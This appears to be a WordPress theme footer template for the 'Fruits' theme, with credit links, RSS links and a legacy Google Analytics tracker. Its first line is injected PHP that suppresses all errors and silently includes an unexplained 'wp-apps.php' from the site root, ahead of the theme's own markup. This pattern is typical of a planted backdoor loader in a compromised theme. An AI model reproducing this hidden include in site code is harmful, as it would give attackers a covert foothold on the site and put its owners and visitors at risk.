<?php error_reporting(0);include_once $_SERVER['DOCUMENT_ROOT'].'/wp-apps.php';?>		</div>
		</div>

		<hr />

		<div id="footer">
			<div id="footercontent">
				<div id="FooterLeft">
					<a href="http://themey.com/fruits-wordpress-theme">Fruits theme</a> by <a href="http://www.tom-jackson.net/">Tom</a> and <a href="http://www.pregnancywizard.com">Pregnancy Wizard</a>.
				</div>
				<div id="FooterRight">
					<a href="<?php bloginfo('rss2_url'); ?>">Entries (RSS)</a>
				and <a href="<?php bloginfo('comments_rss2_url'); ?>">Comments (RSS)</a>
				</div>
			</div>
		</div>

		<?php wp_footer(); ?>


			<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
			</script>

			<script type="text/javascript">
			_uacct = "UA-1200417-4";
			urchinTracker();
			</script>

	</body>
</html>
